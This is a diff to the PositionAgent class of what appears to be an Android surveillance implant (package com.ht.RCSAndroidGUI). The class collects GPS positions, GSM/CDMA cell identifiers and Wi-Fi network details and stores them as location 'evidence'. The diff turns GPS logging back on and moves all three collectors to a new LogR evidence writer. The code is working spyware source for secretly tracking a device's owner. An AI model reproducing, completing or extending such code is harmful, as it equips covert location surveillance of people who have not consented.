@@ -5,6 +5,7 @@ import java.io.IOException;
 import java.util.Date;
 
 import com.ht.RCSAndroidGUI.Device;
+import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
 import com.ht.RCSAndroidGUI.conf.Configuration;
@@ -45,23 +46,11 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	private boolean cellEnabled;
 	private boolean wifiEnabled;
 
-	Evidence logGps;
-	Evidence logCell;
-	Evidence logWifi;
-
 	int period;
 
 	@Override
 	public void begin() {
-		if (logGps == null) {
-			logGps = new Evidence(EvidenceType.LOCATION_NEW);
-		}
-		if (logCell == null) {
-			logCell = new Evidence(EvidenceType.LOCATION_NEW);
-		}
-		if (logWifi == null) {
-			logWifi = new Evidence(EvidenceType.LOCATION_NEW);
-		}
+
 		locator = new GPSLocator(this, period);
 		locator.start();
 
@@ -69,7 +58,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 	@Override
 	public void end() {
-		locator.requestStop();
+		locator.halt();
+		locator.stop();
+		locator = null;
 	}
 
 	@Override
@@ -130,7 +121,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			// #ifdef DEBUG
 			Log.d(TAG, "actualRun: gps");
 			// #endif
-			// locationGPS();
+			locationGPS();
 		}
 		if (cellEnabled) {
 			// #ifdef DEBUG
@@ -160,10 +151,13 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			final byte[] payload = getWifiPayload(wifi.getBSSID(),
 					wifi.getSSID(), wifi.getRssi());
 
-			logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
-					EvidenceType.LOCATION_NEW);
-			logWifi.writeEvidence(payload);
-			logWifi.close();
+			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+					getAdditionalData(1, LOG_TYPE_WIFI), payload);
+
+			// logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
+			// EvidenceType.LOCATION_NEW);
+			// logWifi.writeEvidence(payload);
+			// logWifi.close();
 		} else {
 			// #ifdef DEBUG
 			Log.d(TAG, "Warn: " + "Wifi disabled");
@@ -182,25 +176,24 @@ public class PositionAgent extends AgentBase implements LocationListener {
 				.getResources().getConfiguration();
 
 		if (Device.isGprs()) {
-			TelephonyManager tm  = 
-	            (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE); 
+			TelephonyManager tm = (TelephonyManager) Status.getAppContext()
+					.getSystemService(Context.TELEPHONY_SERVICE);
 			GsmCellLocation cell = (GsmCellLocation) tm.getCellLocation();
+			if (cell != null) {
+				// Integer.parseInt(Integer.toHexString(conf.mcc));
+				final int mcc = conf.mcc;
 
-			//Integer.parseInt(Integer.toHexString(conf.mcc));
-			final int mcc = conf.mcc;
+				final int mnc = conf.mnc;
+				final int lac = cell.getLac();
+				final int cid = cell.getCid();
+				// final int bsic = 0;
+				final int rssi = 0; // TODO: prenderlo dal TelephonyManager
 
-			final int mnc = conf.mnc;
-			final int lac = cell.getLac();
-			final int cid = cell.getCid();
-			// final int bsic = 0;
-			final int rssi = 0; // TODO: prenderlo dal TelephonyManager
+				final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
 
-			final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
-
-			logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM),
-					EvidenceType.LOCATION_NEW);
-			saveEvidence(logCell, payload, LOG_TYPE_GSM);
-			logCell.close();
+				new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+						getAdditionalData(0, LOG_TYPE_GSM), payload);
+			}
 
 		}
 		if (Device.isCdma()) {
@@ -219,10 +212,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			mb.append(" BID: " + bid);
 
 			final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
-			logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA),
-					EvidenceType.LOCATION_NEW);
-			saveEvidence(logCell, payload, LOG_TYPE_CDMA);
-			logCell.close();
+			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+					getAdditionalData(0, LOG_TYPE_CDMA), payload);
+
 		}
 	}
 
@@ -230,25 +222,40 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 	private void locationGPS() {
 		if (locator == null) {
-
 			Log.d(TAG, "Error: " + "GPS Not Supported on Device");
-
 			return;
 		}
 
-		if (waitingForPoint) {
-
+		if (lastLocation == null) {
 			Log.d(TAG, "waitingForPoint");
 
 			return;
 		}
 
 		synchronized (this) {
-			// lm.getLastKnownLocation(provider);
-			// LocationHelper.getInstance().locationGPS(lp, this, false);
+			// #ifdef DEBUG
+			Log.d(TAG, "newLocation");
+			// #endif
+
+			final float speed = lastLocation.getSpeed();
+			final float course = lastLocation.getBearing();
+
+			final long timestamp = lastLocation.getTime();
+
+			// #ifdef DEBUG
+			Log.d(TAG, "valid");
+			// #endif
+			final byte[] payload = getGPSPayload(lastLocation, timestamp);
+
+			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+					getAdditionalData(0, LOG_TYPE_GPS), payload);
+
+			lastLocation = null;
 		}
 
 	}
+
+	Location lastLocation;
 
 	public void onLocationChanged(Location location) {
 		if (location != null) {
@@ -256,36 +263,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			double lng = location.getLongitude();
 			Log.d(TAG, "lat: " + lat + " lon:" + lng);
 		}
-
-		// #ifdef DEBUG
-		Log.d(TAG, "newLocation");
-		// #endif
-
-		// #ifdef DBC
-		Check.requires(logGps != null, "logGps == null");
-		// #endif
-
-		if (location == null) {
-			// #ifdef DEBUG
-			Log.d(TAG, "Error: " + "Error in getLocation");
-			// #endif
-			return;
+		synchronized (this) {
+			lastLocation = location;
 		}
-
-		final float speed = location.getSpeed();
-		final float course = location.getBearing();
-
-		final long timestamp = location.getTime();
-
-		// #ifdef DEBUG
-		Log.d(TAG, "valid");
-		// #endif
-		final byte[] payload = getGPSPayload(location, timestamp);
-
-		logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
-				EvidenceType.LOCATION_NEW);
-		saveEvidence(logGps, payload, TYPE_GPS);
-		logGps.close();
 
 	}
 
